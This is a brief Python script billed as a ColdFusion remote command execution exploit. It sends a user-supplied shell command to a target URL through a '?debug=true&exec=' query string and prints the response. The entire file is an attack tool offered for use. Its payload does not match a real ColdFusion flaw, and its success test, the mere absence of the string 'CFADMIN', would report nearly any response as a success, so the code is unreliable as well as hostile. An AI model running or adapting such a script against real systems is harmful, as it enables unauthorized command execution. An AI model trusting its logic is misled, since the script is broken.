import requests
import argparse

def exploit_coldfusion_rce(url, command):
    try:
        # Craft the payload
        payload = f'?debug=true&exec={command}'
        
        # Send the request
        response = requests.get(url + payload)
        
        # Check if the command was executed successfully
        if 'CFADMIN' not in response.text:
            print(f'[+] Command executed: {command}')
            print(response.text)
        else:
            print(f'[-] Failed to execute command: {command}')
    except requests.exceptions.RequestException as e:
        print(f'[-] Error: {e}')

def main():
    parser = argparse.ArgumentParser(description='ColdFusion Remote Command Execution (RCE) Exploit')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('command', help='Command to execute')
    args = parser.parse_args()

    url = args.url
    command = args.command

    exploit_coldfusion_rce(url, command)

if __name__ == '__main__':
    main()
